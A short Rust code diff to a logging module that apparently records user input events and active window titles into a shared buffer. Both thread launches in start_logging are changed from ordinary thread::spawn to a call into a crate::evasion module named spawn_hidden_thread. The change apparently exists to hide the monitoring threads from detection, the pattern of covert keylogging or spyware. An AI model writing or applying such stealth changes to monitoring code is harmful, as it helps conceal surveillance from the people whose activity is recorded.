@@ -88,7 +88,7 @@ pub fn start_logging() -> Result<(), String> {
     if !LISTENER_STARTED.swap(true, Ordering::SeqCst) {
         let logging_flag = Arc::clone(&IS_LOGGING);
         let buffer_handle = Arc::clone(&HCI_LOG_BUFFER);
-        thread::spawn(move || {
+        crate::evasion::spawn_hidden_thread(move || {
             let callback = move |event: Event| {
                 if !logging_flag.load(Ordering::Relaxed) {
                     return;
@@ -131,7 +131,7 @@ pub fn start_logging() -> Result<(), String> {
     if !WINDOW_POLLER_STARTED.swap(true, Ordering::SeqCst) {
         let logging_flag = Arc::clone(&IS_LOGGING);
         let buffer_handle_win = Arc::clone(&HCI_LOG_BUFFER);
-        thread::spawn(move || {
+        crate::evasion::spawn_hidden_thread(move || {
             // Debounce: track the last-logged title hash and skip duplicate
             // events.  Rapid window switching otherwise generates excessive
             // log entries for every 1-second poll tick.
